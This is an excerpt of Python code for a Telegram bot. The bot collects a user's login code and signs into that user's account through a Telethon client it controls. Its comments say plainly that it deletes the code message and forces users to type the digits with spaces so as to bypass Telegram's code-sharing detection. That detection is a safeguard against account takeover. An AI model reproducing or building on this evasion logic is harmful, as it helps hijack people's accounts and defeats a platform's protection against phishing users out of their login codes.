...
async def text_handler(event):
    ...
    # ── Auth Code ──
        ...
        try:
            # Delete the user's message immediately to prevent Telegram code-sharing detection
            try:
                await event.delete()
            except Exception:
                pass

            # Reject codes without spaces — force spaced format to bypass Telegram's detection
            raw_digits = text.replace(' ', '').replace('-', '').replace('.', '')
            if raw_digits.isdigit() and ' ' not in text:
                await event.respond(
                    '⚠️ **Do NOT send the code as-is!**\n\n'
                    'Telegram will block the login if you paste the code directly.\n'
                    f'Please enter it with **spaces between each digit**:\n'
                    f'e.g. `{" ".join(raw_digits)}`',
                    parse_mode='md'
                )
                return

            # Strip spaces/dashes/dots to get the actual code
            code = raw_digits
            # Always recreate client from saved session to preserve DC migration state
            if u.temp_client and u.temp_client.is_connected():
                await u.temp_client.disconnect()
            u.temp_client = TelegramClient(StringSession(u.temp_session_str), API_ID, API_HASH)
            await u.temp_client.connect()
            await u.temp_client.sign_in(u.phone, code, phone_code_hash=u.phone_code_hash)
            # Success
            ...
            await event.respond('❌ Invalid code. Try again (use **spaces between digits**, e.g. `1 2 3 4 5`):', parse_mode='md')
            ...
            try:
                ...
                await event.respond(
                    ...
                    'Enter the new code with **spaces between digits** (e.g. `1 2 3 4 5`):',
                    parse_mode='md'
                )
